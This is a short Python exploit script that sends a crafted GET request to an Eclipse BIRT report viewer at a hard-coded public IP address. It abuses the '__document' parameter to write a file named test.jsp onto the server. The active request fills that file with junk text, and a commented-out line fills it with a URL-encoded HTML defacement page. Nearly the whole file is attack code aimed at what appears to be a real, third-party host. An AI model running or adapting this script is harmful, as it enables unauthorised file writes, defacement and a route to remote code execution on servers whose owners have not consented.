import requests as re


payload="%3Chtml%3E%0A%3Ctitle%3Ellmao%3C%2Ftitle%3E%0A%3Cbody%3E%0A%3Cimg%20src%3D%22https%3A%2F%2Fc4.wallpaperflare.com%2Fwallpaper%2F966%2F989%2F139%2Fshrek-movies-animated-movies-dreamworks-hd-wallpaper-preview.jpg%22%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E"

#url = f"http://14.99.184.178:8080/birt/output?__report=test.rptdesign&__format=pdf&__overwrite=true&__document=./test.jsp&sample={payload}"
url = f"http://14.99.184.178:8080/birt/output?__report=test.rptdesign&__format=pdf&__overwrite=true&__document=./test.jsp&sample={'iam danger'*100}"


send=re.get(url)

print(send.status_code)
